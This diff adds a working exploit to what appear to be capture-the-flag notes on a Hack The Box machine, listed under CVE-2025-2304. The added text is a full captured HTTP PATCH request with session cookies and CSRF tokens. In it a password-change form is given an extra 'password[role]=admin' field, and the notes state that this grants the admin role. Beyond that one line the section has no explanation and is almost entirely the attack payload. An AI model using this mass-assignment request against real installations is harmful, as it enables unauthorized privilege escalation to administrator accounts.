@@ -199,8 +199,27 @@ found cve https://github.com/advisories/GHSA-rp28-mvq3-wf8j
 
 ## CVE-2025-2304
 
+POST /admin/users/5/updated_ajax HTTP/1.1
+Host: facts.htb
+Content-Length: 192
+X-CSRF-Token: p33_DuI4794Bp520paCpN13Jnk4G5Prn5g39AXxRBFNpxChKhZ1oL0rGd4nyuf_zZVlClSgW73tnuCveritaow
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-US,en;q=0.9
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Origin: http://facts.htb
+Referer: http://facts.htb/admin/profile/edit
+Accept-Encoding: gzip, deflate, br
+Cookie: auth_token=TxNXpRRU19ZO8YP1oXH7Uw&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F144.0.0.0+Safari%2F537.36&10.10.15.98; _factsapp_session=5slRU9Vl6%2BFm24F%2BAaGWSMms0sYsjd%2FgyErNo%2FQsx%2BOY6NRnOyVFkm7NHG08%2Bboo2UKlQKmM%2BO594wYu2bccS3nQz7UBXS65hc8reHpR3KU5pIu%2FA%2FH924QVCw9vy8RBn%2Fe3NWfh14K1nsknIUYBxzP1KnM2SJGfqp5JFzkCoDKhWN698VVzcdNyYHi90NCx0saCDN3HtxRJsnT0fhwzZFaHxz0HFa0wix0kY7rUrLhRqil%2BFPrDF%2BTSAsg24Bn1J1e1%2FVEzj2jonhhxDtx606OnuHIaUzInZ0fXtiq9fhh%2BQbE9R90YIGWLK3HFdm9vYyz2EG5iuEZjtN9PxF6FRLQ7cdFMvN1qSmyg98oSBBi2LfwBKgpjaBXLEJtlmfbmHORLuWiJeWzO7m%2FImoloq%2Fm49HII7TLMD6TdYjfWZPoK--AslKLwVghiiFQ9Os--8g0aPzGUG9qOudCKJ8zogw%3D%3D
+Connection: keep-alive
 
+_method=patch&authenticity_token=p33_DuI4794Bp520paCpN13Jnk4G5Prn5g39AXxRBFNpxChKhZ1oL0rGd4nyuf_zZVlClSgW73tnuCveritaow&password%5Bpassword%5D=test10&password%5Bpassword_confirmation%5D=test10&password[role]=admin
+
+by this way we can get the admin role
 ```
+
+
 
 
 
